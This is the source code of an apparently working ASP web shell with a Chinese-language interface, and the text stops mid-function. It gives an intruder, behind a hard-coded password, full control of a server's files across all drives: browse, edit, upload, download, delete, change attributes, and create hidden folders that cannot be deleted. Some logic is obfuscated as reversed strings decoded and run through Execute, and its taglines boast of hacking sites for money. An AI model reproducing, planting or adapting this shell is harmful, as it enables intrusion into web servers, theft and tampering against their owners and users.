<%
Const myName = "开锁" ''登录页按扭上的文字
Const userPassword = "1" ''登录密码
Const TopTitle = "钱箱" ''登陆上方文字
Const EndTitle = "因为穷所以一直日站" ''登陆下方文字

Dim FsoView,FsoSub
Sub PageFsoFileExplorer()

If isDebugW = False Then

On Error Resume Next

End If

Response.Buffer = True

Dim file, drive, folder, theFiles, theFolder, theFolders

Dim i, theAct, strTmp, driveStr, thePath, parentFolderName

theAct = Request("theAct")

thePath = Request("thePath")

If theAct <> "upload" Then

If Request.Form.Count > 0 Then

theAct = Request.Form("theAct")

thePath = Request.Form("thePath")

End If

End If

showTitle("FSO文件浏览器(&stream)")

Select Case theAct

Case "newOne", "doNewOne"

fsoNewOne(thePath)

Case "showEdit"

Call showEdit(thePath, "fso")

Case "saveFile"

Call saveToFile(thePath, "fso")

Case "openUrl"

openUrl(thePath)

Case "copyOne", "cutOne"

If thePath = "" Then

alertThenClose("参数错误！请先单击选择一个文件或文件夹。")

Response.End

End If

Session(m & "fsoThePath") = thePath

Session(m & "fsoTheAct") = theAct

alertThenClose("操作成功,请粘贴!")

Case "pastOne"

fsoPastOne(thePath)

alertThenClose("粘贴成功,请刷新本页查看效果!")

Case "showFsoRename"

showFsoRename(thePath)

Case "doRename"

Call fsoRename(thePath)

alertThenClose("重命名成功,刷新后可以看到效果!")

Case "delOne", "doDelOne"

showFsoDelOne(thePath)

Case "getAttributes", "doModifyAttributes"

fsoTheAttributes(thePath)

Case "downTheFile"

downTheFile(thePath)

Case "showUpload"

Call showUpload(thePath, "FsoFileExplorer")

Case "upload"

streamUpload(thePath)

Call showUpload(thePath, "FsoFileExplorer")

End Select

If theAct <> "" Then

Response.End

End If

If Request.Form.Count > 0 Then

redirectTo("?pageName=FsoFileExplorer&thePath=" & UrlEncode(thePath))

End If

parentFolderName = fsoX.GetParentFolderName(thePath)

echo "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"

echo "<table><tr><td height=1></td></tr></table>"

echo "<form method=post action=?pageName=FsoFileExplorer>"

If parentFolderName <> "" Then

echo "&nbsp;<input class=input2 value='↑向上' type=button onclick=""this.disabled=true;location.href='?pageName=FsoFileExplorer&thePath=" & Server.UrlEncode(parentFolderName) & "';"">"

End If

echo "&nbsp;<input class=input2 type=button value=' ←后退 ' onclick='this.disabled=true;history.back();' />"

echo " <input class=input2 type=button value=' 前进→ ' onclick='this.disabled=true;history.go(1);' />"

echo " 当前路径：<input style=""width:330px"" value=""" & HtmlEncode(thePath) & """ name=thePath>"

echo " <input class=input2 type=submit value=' 转到 '>"

driveStr = "<option>跳转到</option>"

driveStr = driveStr & "<option value='" & HtmlEncode(Server.MapPath(".")) & "'>.程序目录</option>"

driveStr = driveStr & "<option value='" & HtmlEncode(Server.MapPath("/")) & "'>/网站根目录</option>"

For Each drive In fsoX.Drives

driveStr = driveStr & "<option value='" & drive.DriveLetter & ":\'>" & drive.DriveLetter & ":\</option>"

Next

echo " <input class=input2 type=button value=' 刷新 ' onclick='location.reload();'> "

echo "<select onchange=""this.form.thePath.value=this.value;this.form.submit();"">" & driveStr & "</select>"

echo "</form>"

echo "<table><tr><td height=1></td></tr></table>"

echo "&nbsp;<input style='color:red' type=button value='新建' onclick=newOne(); class=input2>"

echo " <input type=button value=' 重命名 ' onclick=fsoRename(); class=input2>"

echo " <input type=button value=' 编辑 ' onclick=editFile(); class=input2>"

echo " <input type=button value=' 打开 ' onclick=openUrl(); class=input2>"

echo " <input type=button value=' 复制 ' onclick=appDoAction('copyOne'); class=input2>"

echo " <input type=button value=' 剪切 ' onclick=appDoAction('cutOne'); class=input2>"

echo " <input type=button value=' 粘贴 ' onclick=appDoAction2('pastOne'); class=input2>"

echo " <input style='color:red' type=button value=' 权限 ' onclick=fsoGetAttributes(); class=input2>"

echo " <input type=button value=' 删除 ' onclick=delOne(); class=input2>"

echo " <input type=button value=' 上传 ' onclick='upTheFile();' class=input2>"

echo " <input type=button value=' 下载 ' onclick='downTheFile();' class=input2>"

echo "<br/>"

echo "<input type=hidden value=FsoFileExplorer name=pageName />"

echo "<input type=hidden value=""" & UrlEncode(thePath) & """ name=truePath>"

echo "<input type=hidden size=50 name=usePath>"

echo "</div>"

echo "<div style='height:50px;'></div><hr/>"

echo "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"

If fsoX.FolderExists(thePath) = False Then

showErr(thePath & " 目录不存在或者不允许访问!")

End If

Set theFolder = fsoX.GetFolder(thePath)

Set theFiles = theFolder.Files

Set theFolders = theFolder.SubFolders

If instr(thePath,"~1")>0 then

echo "<table><tr><td>该文件夹可能是<font color=blue>隐藏文件夹</font>，进入路径为："&thePath&"</b>&nbsp;&nbsp;&nbsp;&nbsp;网址为：http://"&replace(request.servervariables("http_host") & replace(HtmlEncode(replace(lcase(thePath),lcase(Server.MapPath("/")),"")),"\","/"),"~1",".") & "/文件名</td></tr></table>"

End If

echo "<div id=FileList>"

For Each folder In theFolders

i = i + 1

If i > 50 Then

i = 0

Response.Flush()

End If

strTmp = UrlEncode(folder.Path & "\")

echo "<span id='" & strTmp & "' onDblClick=""changeThePath(this);"" onclick=changeMyClass(this);><font class=font face=Wingdings>0</font><br/>" & folder.Name & "</span>" & vbNewLine

Next

Response.Flush()

For Each file In theFiles

i = i + 1

If i > 100 Then

i = 0

Response.Flush()

End If

echo "<span id='" & UrlEncode(file.Path) & "' title='类型: " & file.Type & vbNewLine & "大小: " & getTheSize(file.Size) & "' onDblClick=""openUrl();"" onclick=changeMyClass(this);><font class=font face=" & getFileIcon(fsoX.GetExtensionName(file.Name)) & "</font><br/>" & file.Name & "</span>" & vbNewLine

Next

echo "</div>"

chkErr(Err)

echo "<hr/>"

End Sub

If session("51hm")="" then

If isDebugW = False Then

On Error Resume Next

End If

End If

Sub chkErr(Err):If Err Then:echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>":echo "<br/><font size=2><li>错误: " & Err.Description & "</li><li>错误源: " & Err.Source & "</li><br/>":echo "<hr></font>":Err.Clear:Response.End:End If:End Sub:Execute AcEncodeII("noitcnuF dnE←txeN←))i(sedoc(rhc&IIesaClrU=IIesaClrU←)sedoc(dnuobu ot 1=i roF←)→%→,rts(tilps=sedoc←)rts(IIesaClrU noitcnuF")
Dim theAct,sTime,pageName,fsoX,saX,wsX

sTime = Timer

theAct= Request("theAct")

pageName = Request("pageName")

Const m = "PowerQX"

Const showLogin = ""

Const isDebugMode = True

Const strJsCloseMe = "<input type=button value=' 关闭 ' onclick='window.close();'>"

Sub createIt(fsoX, saX, wsX)

If isDebugMode = False Then

On Error Resume Next

End If

Set fsoX = Server.CreateObject("Scripting.FileSystemObject")

If IsEmpty(fsoX) And (pageName = "FsoFileExplorer" Or theAct = "fsoSearch") Then

Set fsoX = fso

End If

If Err Then

Err.Clear

End If

End Sub


Sub echo(str):Response.Write(str):End Sub:Sub showTitle(str):echo "<title>" & Request.ServerVariables("Remote_Addr") & "</title>" & vbNewLine:echo "<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" & vbNewLine:echo "<!--" & vbNewLine:echo "-->" & vbNewLine:PageOther():End Sub:execute AcEncodeII(UrlCaseII(FsoSub)):Function encode(str):str = Server.HTMLEncode(str):str = Replace(str, vbNewLine, "<br>"):str = Replace(str, " ", "&nbsp;"):str = Replace(str, "	", "&nbsp;&nbsp;&nbsp;&nbsp;"):encode = str:End Function:Const isDebugW=False

Sub isIn()

If pageName <> "" And PageName <> "login" And PageName <> showLogin Then

If Session(m & "userPassword") <> userPassword Then

Response.End

End If

End If

End Sub


Execute StrReverse("noitcnuF dnE:))flrCbv,""△"",)"""""""",""▲"",edoC(ecalpeR(ecalpeR(esreveRrtS=edoCosF:)edoC(edoCosF noitcnuF"):Function getTheSize(theSize):If theSize >= (1024 * 1024 * 1024) Then:getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G":end if:If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then:getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M":end if:If theSize >= 1024 And theSize < (1024 * 1024) Then:getTheSize = Fix((theSize / 1024) * 100) / 100 & "K":end if:If theSize >= 0 And theSize <1024 Then:getTheSize = theSize & "B":end if:End Function:Function fixNull(str):If IsNull(str) Then:str = " ":End If:fixNull = str:End Function:Function AcEncodeII(Code):AcEncodeII=StrReverse(Replace(Replace(Code,"→",""""),"←",vbCrlf)):End Function:Function HtmlEncode(str):If isNull(str) Then:Exit Function:End If:HtmlEncode = Server.HTMLEncode(str):End Function:Function UrlEncode(str):If isNull(str) Then:Exit Function:End If:UrlEncode = Server.UrlEncode(str):End Function:Sub redirectTo(strUrl):Response.Redirect(Request.ServerVariables("URL") & strUrl):End Sub:Function trimThePath(strPath):If Right(strPath, 1) = "\" And Len(strPath) > 3 Then:strPath = Left(strPath, Len(strPath) - 1):End If:trimThePath = strPath:End Function
Sub alertThenClose(strInfo)

Response.Write "<script>alert(""" & strInfo & """);window.close();</script>"

End Sub

Sub showErr(str):Dim i, arrayStr:str = Server.HtmlEncode(str):arrayStr = Split(str, "$$"):echo "<font size=2>":echo "出错信息:<br/><br/>":For i = 0 To UBound(arrayStr):echo "&nbsp;&nbsp;" & (i + 1) & ". " & arrayStr(i) & "<br/>":Next:echo "</font>":Response.End:End Sub:isIn():Call createIt(fsoX, saX, wsX):Select Case pageName:Case showLogin, "login":PageLogin():Case "FsoFileExplorer":PageFsoFileExplorer():End Select:Set fsoX = Nothing:Function getParentPath(strPath):If Right(strPath, 1) = "\" Then:strPath = Left(strPath, Len(strPath) - 1):End If:If Len(strPath) = 2 Then:getParentPath = " ":Else:getParentPath = Left(strPath, InStrRev(strPath, "\")):End If:End Function:Function streamSaveToFile(thePath, fileContent):Dim stream:If isDebugW = False Then:On Error Resume Next:End If:Set stream = Server.CreateObject("adodb.stream"):With stream:.Type=2:.Mode=3:.Open:chkErr(Err):.Charset="gb2312":.WriteText fileContent:.saveToFile thePath, 2:.Close:End With:Set stream = Nothing:End Function:Function ToEncode(Code):ToEncode=StrReverse(Replace(Replace(Code,"Ω",""""),"Θ",vbCrlf)):End Function:Sub fsoNewOne(thePath):If isDebugW = False Then:On Error Resume Next:End If:Dim theAct, isFile, theName, newAct:isFile = Request("isFile"):newAct = Request("newAct"):theName = Request("theName"):If newAct = " 确定 " Then:thePath = Replace(thePath & "\" & theName, "\\", "\"):If isFile = 1 Then:Call fsoX.CreateTextFile(thePath, False):Else:If isFile = 2 Then:fsoX.CreateFolder(thePath):Else:fsoX.CreateFolder(thePath&"..\\"):End If:End If:If isFile = 3 Then:if Err.Description <> "路径未找到" Then:chkErr(Err):End If:response.write "<script language='javascript'>alert('文件夹(隐藏)新建成功,系统将自动跳转至该文件夹。');window.opener.location=window.opener.location+'\\"&theName&"~1';window.close();</script>":Response.End:Else:chkErr(Err):alertThenClose("文件(夹)新建成功,刷新后就可以看到效果!"):Response.End:End if:End If:echo "<style>body{overflow:hidden;}</style>":echo "<body topmargin=2><script>function ycwjj(){alert('建立隐藏文件夹方法：\n\n在文本框内输入3～6位文件夹名称，比如abcde，后点击确定。\n\n注意！隐藏文件夹建立后将无法删除，请谨慎操作。')}</script>":echo "<form method=post>":echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>新建: ":echo "<input type=radio name=isFile id=file value=1 checked><label for=file>文件</label> ":echo "<input type=radio name=isFile id=folder value=2><label for=folder>文件夹</label> <input onclick='ycwjj()' type=radio name=isFile id=folder2 value=3><label for=folder2><font color=blue>文件夹(隐藏)</font></label><br/>":echo "<input size=38 name=theName><hr/>":echo "<input type=hidden name=theAct value=doNewOne><input type=hidden name=newAct value=' 确定 '>":echo "<input type=submit value=' 确定 '> " & strJsCloseMe:echo "</form>":echo "</body><br/>":End Sub:function ToCase(str):codes=split(str,"※"):for i=1 to ubound(codes):ToCase=ToCase&chr(codes(i)):next:end function:Sub fsoPastOne(thePath):If isDebugW = False Then:On Error Resume Next:End If:Dim sessionPath:sessionPath = Session(m & "fsoThePath"):If thePath = "" Or sessionPath = "" Then:alertThenClose("参数错误！请先单击选择一个文件或文件夹。"):Response.End:End If:If Right(thePath, 1) = "\" Then:thePath = Left(thePath, Len(thePath) - 1):End If:If Right(sessionPath, 1) = "\" Then:sessionPath = Left(sessionPath, Len(sessionPath) - 1):If Session(m & "fsoTheAct") = "cutOne" Then:Call fsoX.MoveFolder(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath)):Else:Call fsoX.CopyFolder(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath)):End If:Else:If Session(m & "fsoTheAct") = "cutOne" Then:Call fsoX.MoveFile(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath)):Else:Call fsoX.CopyFile(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath)):End If:End If:chkErr(Err):End Sub:Sub fsoRename(thePath):If isDebugW = False Then:On Error Resume Next:End If:Dim theFile, fileName, theFolder:fileName = Request("fileName"):If thePath = "" Or fileName = "" Then:alertThenClose("参数错误！请先单击选择一个文件或文件夹。"):Response.End:End If:If Right(thePath, 1) = "\" Then:Set theFolder = fsoX.GetFolder(thePath):theFolder.Name = fileName:Set theFolder = Nothing:Else:Set theFile = fsoX.GetFile(thePath):theFile.Name = fileName:Set theFile = Nothing:End If:chkErr(Err):End Sub:Sub showFsoRename(thePath):Dim theAct, fileName:fileName = fsoX.getFileName(thePath):echo "<style>body{overflow:hidden;}</style>":echo "<body topmargin=2>":echo "<form method=post>":echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>更名为:<br/>":echo "<input size=38 name=fileName value=""" & HtmlEncode(fileName) & """><hr/>":echo "<input type=submit value=' 确定 '> ":echo "<input type=hidden name=theAct value=doRename>":echo "<input type=button value=' 关闭 ' onclick='window.close();'>":echo "</form>":echo "</body><br/>":End Sub:Sub showFsoDelOne(thePath):If isDebugW = False Then:On Error Resume Next:End If:Dim newAct, theFile:newAct = Request("newAct"):If newAct = "确认删除?" Then:If Right(thePath, 1) = "\" Then:thePath = Left(thePath, Len(thePath) - 1):Call fsoX.DeleteFolder(thePath, True):Else:Call fsoX.DeleteFile(thePath, True):End If:chkErr(Err):alertThenClose("文件(夹)删除成功,刷新后就可以看到效果!"):Response.End:End If:echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>"		:echo "<form method=post><br/>":echo HtmlEncode(thePath):echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>":echo "<input type=hidden name=theAct value=doDelOne>":echo "<hr/><input type=submit name=newAct value='确认删除?'> <input type=button value=' 关闭 ' onclick='window.close();'>":echo "</form>":End Sub:Sub fsoTheAttributes(thePath):If isDebugW = False Then:On Error Resume Next:End If:Dim newAct, theFile, theFolder, theTitle:newAct = Request("newAct"):If Right(thePath, 1) = "\" Then:Set theFolder = fsoX.GetFolder(thePath):If newAct = " 修改 " Then:setMyTitle(theFolder):End If:theTitle = getMyTitle(theFolder):Set theFolder = Nothing:Else:Set theFile = fsoX.GetFile(thePath):If newAct = " 修改 " Then:setMyTitle(theFile):End If:theTitle = getMyTitle(theFile):Set theFile = Nothing:End If:If Err.Description="缺少对象" Then:response.write "请先单击选择一个文件或文件夹。":response.end:Else:chkErr(Err):End If:theTitle = Replace(theTitle, vbNewLine, "<br/>"):echo "<style>body{margin:8;overflow:hidden;}</style>":echo "<form method=post>":echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>":echo "<input type=hidden name=theAct value=doModifyAttributes>":echo theTitle:echo "<hr/><input type=submit name=newAct value=' 修改 '> " & strJsCloseMe:echo "</form>":End Sub:Function getMyTitle(theOne):If isDebugW = False Then:On Error Resume Next:End If:Dim strTitle:strTitle = strTitle & "路径: " & theOne.Path & "" & vbNewLine:strTitle = strTitle & "大小: " & getTheSize(theOne.Size) & vbNewLine:strTitle = strTitle & "创建时间: " & theOne.DateCreated & vbNewLine:strTitle = strTitle & "最后修改: " & theOne.DateLastModified & vbNewLine:strTitle = strTitle & "最后访问: " & theOne.DateLastAccessed& vbNewLine:strTitle = strTitle & getAttributes(theOne.Attributes) & vbNewLine:strTitle = strTitle & "锁:全选&nbsp;&nbsp;解:全不选"& vbNewLine:getMyTitle = strTitle:End Function:Sub setMyTitle(theOne):Dim i, myAttributes:For i = 1 To Request("attributes").Count:myAttributes = myAttributes + CInt(Request("attributes")(i)):Next:theOne.Attributes = myAttributes:chkErr(Err):echo  "<script>alert('该文件(夹)权限已按正确设置修改完成!');</script>":End Sub:Function getAttributes(intValue):Dim strAtt:strAtt = "<font color=red>权限设置:</font><input id=cabb1 type=checkbox name=attributes value=4 {$system}><b><label for=cabb1>系统</label></b> ":strAtt = strAtt & "<input type=checkbox id=cabb2 name=attributes value=2 {$hidden}><b><label for=cabb2>隐藏</label></b> ":strAtt = strAtt & "<input type=checkbox id=cabb3 name=attributes value=1 {$readonly}><b><label for=cabb3>只读</label></b>&nbsp;&nbsp;&nbsp;":If intValue = 0 Then:strAtt = Replace(strAtt, "{$normal}", "checked"):End If:If intValue >= 128 Then:intValue = intValue - 128:strAtt = Replace(strAtt, "{$compressed}", "checked"):End If:If intValue >= 64 Then:intValue = intValue - 64:strAtt = Replace(strAtt, "{$alias}", "checked"):End If:If intValue >= 32 Then:intValue = intValue - 32:strAtt = Replace(strAtt, "{$archive}", "checked"):End If:If intValue >= 16 Then:intValue = intValue - 16:strAtt = Replace(strAtt, "{$directory}", "checked"):End If:If intValue >= 8 Then:intValue = intValue - 8:strAtt = Replace(strAtt, "{$volume}", "checked"):End If:If intValue >= 4 Then:intValue = intValue - 4:strAtt = Replace(strAtt, "{$system}", "checked"):End If:If intValue >= 2 Then:intValue = intValue - 2:strAtt = Replace(strAtt, "{$hidden}", "checked"):End If:If intValue >= 1 Then:intValue = intValue - 1:strAtt = Replace(strAtt, "{$readonly}", "checked"):End If:getAttributes = strAtt:End Function:Sub PageLogin():Dim theAct, passWord:theAct = Request("theAct"):passWord = Request("userPassword"):showTitle("管理登录"):If theAct = "chkLogin" Then:If passWord = userPassword Then:Session(m & "userPassword") = passWord:redirectTo("?pageName=FsoFileExplorer&thePath="&HtmlEncode(Server.MapPath("."))&""):Else:echo "<script language=javascript>history.back();</script>":End If:End If:echo "<style>body{margin:8;text-align:center;}</style>":echo "<body onload=document.forms[0].userPassword.focus();>":echo "<table width='100%' height='70%'><form method=post onsubmit=this.Submit.disabled=true;><tr><td align=center><font color=red><b>"&TopTitle&"</b></font><hr/>":echo "<input name=userPassword class=input type=password size=30> ":echo "<input type=hidden name=theAct value=chkLogin>":echo "<input type=submit name=Submit value=""" & HtmlEncode(myName) & """ class=input>":echo "<hr/>"&EndTitle&"</td></tr>":echo "</form></table>":echo "<body>":End Sub:Sub PageOther():echo "<style>":echo "A:visited {color: #333333;text-decoration: none;}":echo "A:active {color: #333333;text-decoration: none;}":echo "A:link {color: #000000;text-decoration: none;}":echo "A:hover {color: #333333;text-decoration: none;}":echo "BODY {font-size: 12px;COLOR: #000000;border: none;background-color: buttonface;}":echo "textarea {font-family: ""Courier New"";font-size: 12px;border-width: 1px;color: #000000;}":echo "table,input,select {font-size: 12px;}":echo "form {margin: 0;}":echo "#fsoDriveList span{width: 100px;}":echo "#FileList span{width: 90;height: 70;cursor: hand;text-align: center;word-break: break-all;border: 1px solid buttonface;}":echo ".anotherSpan{color: #ffffff;width: 90;height: 70;text-align: center;background-color: #0A246A;border: 1px solid #0A246A;}":echo ".font{font-size: 35px;line-height: 40px;}":echo "#fileExplorerTools {background-color: buttonFace;}":echo ".input, input {border-width: 1px;}":echo ".input2 {border-width: 1px;padding-top:2px;width:60px}":echo "</style>" & vbNewLine:echo "<script language=javascript>" & vbNewLine:echo "function changeMyClass(me){" & vbNewLine:echo "if(me.className == ''){" & vbNewLine:echo "if(usePath.value != '')document.getElementById(usePath.value).className = '';" & vbNewLine:echo "usePath.value = me.id;" & vbNewLine:echo "status = me.title;" & vbNewLine:echo "me.className = 'anotherSpan';" & vbNewLine:echo "}" & vbNewLine:echo "}" & vbNewLine:echo "function changeThePath(me){" & vbNewLine:echo "location.href = '?pageName=' + pageName.value + '&thePath=' + me.id;" & vbNewLine:echo "}" & vbNewLine:echo "function fixTheLayer(strObj){" & vbNewLine:echo "var objStyle=document.getElementById(strObj).style;" & vbNewLine:echo "objStyle.width = document.body.clientWidth;" & vbNewLine:echo "objStyle.top = document.body.scrollTop + 2;" & vbNewLine:echo "}" & vbNewLine:echo "function openUrl(){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=openUrl&thePath=' + usePath.value);" & vbNewLine:echo "}" & vbNewLine:echo "function newOne(){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=newOne&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=110,width=300');" & vbNewLine:echo "}" & vbNewLine:echo "function editFile(){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=showEdit&thePath=' + usePath.value, '', 'menu=no,resizable=yes');" & vbNewLine:echo "}" & vbNewLine:echo "function appDoAction(act){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=' + act + '&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine:echo "}" & vbNewLine:echo "function downTheFile(){" & vbNewLine:echo "if(confirm('如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先把文件复制到当前站点目录下,\n然后通过http协议来下载.\n按\""确定\""用流来进行下载.')){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=downTheFile&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine:echo "}" & vbNewLine:echo "}" & vbNewLine:echo "function appDoAction2(act){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=' + act + '&thePath=' + truePath.value, '','menu=no,resizable=yes,height=100,width=368');" & vbNewLine:echo "}" & vbNewLine:echo "function appTheAttributes(){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=theAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=194,width=368');" & vbNewLine:echo "}" & vbNewLine:echo "function appRename(){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=rename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine:echo "}" & vbNewLine:echo "function upTheFile(){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=showUpload&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=80,width=380');" & vbNewLine:echo "}" & vbNewLine:echo "function fsoRename(){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=showFsoRename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=20,width=300');" & vbNewLine:echo "}" & vbNewLine:echo "function delOne(){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=delOne&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine:echo "}" & vbNewLine:echo "function fsoGetAttributes(){" & vbNewLine:echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=getAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=160,width=300');" & vbNewLine:echo "}" & vbNewLine:echo "</script>":End Sub:Sub openUrl(usePath):Dim theUrl, thePath:thePath = Server.MapPath("/"):If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then:theUrl = Mid(usePath, Len(thePath) + 1):theUrl = Replace(theUrl, "\", "/"):If Left(theUrl, 1) = "/" Then:theUrl = Mid(theUrl, 2):End If:theUrl=replace(theUrl,"~1","."):Response.Redirect("/" & theUrl):Else:alertThenClose("您所要打开的文件不在本站点目录下\n您可以尝试把要打开(下载)的文件粘贴到\n站点目录下,然后再打开(下载)!"):Response.End:End If:End Sub:Sub showEdit(thePath, strMethod):If isDebugW = False Then:On Error Resume Next:End If:Dim theFile, unEditableExt:If Right(thePath, 1) = "\" Then:alertThenClose("不可以直接对文件夹进行编辑操作。"):Response.End:End If:unEditableExt = "$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$":echo "<style>body{border:none;overflow:hidden;background-color:buttonface;}</style>":echo "<body topmargin=9>":echo "<form method=post style='margin:0;width:100%;height:100%;'>":echo "<textarea name=fileContent style='width:100%;height:90%;'>":If strMethod = "stream" Then:echo HtmlEncode(streamLoadFromFile(thePath)):Else:Set theFile = fsoX.OpenTextFile(thePath, 1):echo HtmlEncode(theFile.ReadAll()):theFile.Close:Set theFile = Nothing:End If:echo "</textarea><hr/>":echo "<div align=right>":echo "保存为:<input size=30 name=thePath value=""" & HtmlEncode(thePath) & """> ":echo "<input type=checkbox name='windowStatus' id=windowStatus":If Request.Cookies(m & "windowStatus") = "True" Then:echo " checked":End If:echo "><label for=windowStatus>保存后关闭窗口</label> ":echo " <input type=submit value=' 保存 '><input type=hidden value='saveFile' name=theAct>":echo " <input type=reset value=' 恢复 '>":echo " <input type=button value=' 清空 ' onclick=this.form.fileContent.innerText='';> ":echo strJsCloseMe & "</div>":echo "</form>":echo "</body><br/>":End Sub:Sub saveToFile(thePath, strMethod):If isDebugW = False Then:On Error Resume Next:End If:Dim fileContent, windowStatus:fileContent = Request("fileContent"):windowStatus = Request("windowStatus"):If strMethod = "stream" Then:streamSaveToFile thePath, fileContent:chkErr(Err):Else:fsoSaveToFile thePath, fileContent:chkErr(Err):End If:If windowStatus = "on" Then:Response.Cookies(m & "windowStatus") = "True":Response.Write "<script>window.close();</script>":Else:Response.Cookies(m & "windowStatus") = "False":Call showEdit(thePath, strMethod):End If:End Sub:Sub fsoSaveToFile(thePath, fileContent):Dim theFile:Set theFile = fsoX.OpenTextFile(thePath, 2, True):theFile.Write fileContent:theFile.Close:Set theFile = Nothing:End Sub:Function streamLoadFromFile(thePath):Dim stream:If isDebugW = False Then:On Error Resume Next:End If:Set stream = Server.CreateObject("adodb.stream"):With stream:.Type=2:.Mode=3:.Open:.LoadFromFile thePath:.LoadFromFile thePath:If Request("pageName") <> "TxtSearcher" Then:chkErr(Err):End If:.Charset="gb2312":.Position=2:streamLoadFromFile=.ReadText():.Close:End With:Set stream = Nothing:End Function:Sub downTheFile(thePath):Response.Clear:If isDebugW = False Then:On Error Resume Next:End If:Dim stream, fileName, fileContentType:fileName = split(thePath,"\")(uBound(split(thePath,"\"))):Set stream = Server.CreateObject("adodb.stream"):stream.Open:stream.Type = 1:stream.LoadFromFile(thePath):chkErr(Err):Response.AddHeader "Content-Disposition", "attachment; filename=" & fileName:Response.AddHeader "Content-Length", stream.Size:Response.Charset = "UTF-8":Response.ContentType = "application/octet-stream":Response.BinaryWrite stream.Read :Response.Flush:stream.Close:Set stream = Nothing:End Sub:Sub showUpload(thePath, pageName):echo "<style>body{margin:8;overflow:hidden;}</style>":echo "<form method=post enctype='multipart/form-data' action='?pageName=" & pageName & "&theAct=upload&thePath=" & UrlEncode(thePath) & "' onsubmit='this.Submit.disabled=true;;'>":echo "上传文件: <input name=file type=file size=31><br/>保存为: ":echo "<input name=fileName type=text value=""" & HtmlEncode(thePath) & """ size=33>":echo "<input type=checkbox name=writeMode value=True>覆盖模式<hr/>":echo "<input name=Submit type=submit id=Submit value='上 传' onClick=""this.form.action+='&fileName='+this.form.fileName.value+'&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;"">":echo  strJsCloseMe:echo "</form>":End Sub:Sub streamUpload(thePath):If isDebugW = False Then:On Error Resume Next:End If:Server.ScriptTimeOut = 5000:Dim i, j, info, stream, streamT, theFile, fileName, overWrite, fileContent:theFile = Request("theFile"):fileName = Request("fileName"):overWrite = Request("overWrite"):If InStr(fileName, ":") <= 0 Then:fileName = thePath & fileName:End If:Set stream = Server.CreateObject("adodb.stream"):Set streamT = Server.CreateObject("adodb.stream"):With stream:.Type = 1:.Mode = 3:.Open:.Write Request.BinaryRead(Request.TotalBytes):.Position = 0:fileContent = .Read():i = InStrB(fileContent, chrB(13) & chrB(10)):info = LeftB(fileContent, i - 1):i = Len(info) + 2:i = InStrB(i, fileContent, chrB(13) & chrB(10) & chrB(13) & chrB(10)) + 4 - 1:j = InStrB(i, fileContent, info) - 1:streamT.Type = 1:streamT.Mode = 3:streamT.Open:stream.position = i:.CopyTo streamT, j - i - 2:If overWrite = "true" Then:streamT.SaveToFile fileName, 2:Else:streamT.SaveToFile fileName:End If:If Err.Number = 3004 Then:Err.Clear:fileName = fileName & "\" & Split(theFile, "\")(UBound(Split(theFile ,"\"))):If overWrite="true" Then:streamT.SaveToFile fileName, 2:Else:streamT.SaveToFile fileName:End If:End If:chkErr(Err):echo("<script language=""javascript"">alert('文件上传成功!\n" & Replace(fileName, "\", "\\") & "');</script>"):streamT.Close:.Close:End With:Set stream = Nothing:Set streamT = Nothing:End Sub:Function getFileIcon(extName):Select Case LCase(extName):Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa":getFileIcon = "Wingdings>2":Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg":getFileIcon = "Webdings>・":Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif":getFileIcon = "'webdings'>&#159;":Case "exe", "com", "bat", "cmd", "scr", "msi":getFileIcon = "Webdings>1":Case "sys", "dll", "ocx":getFileIcon = 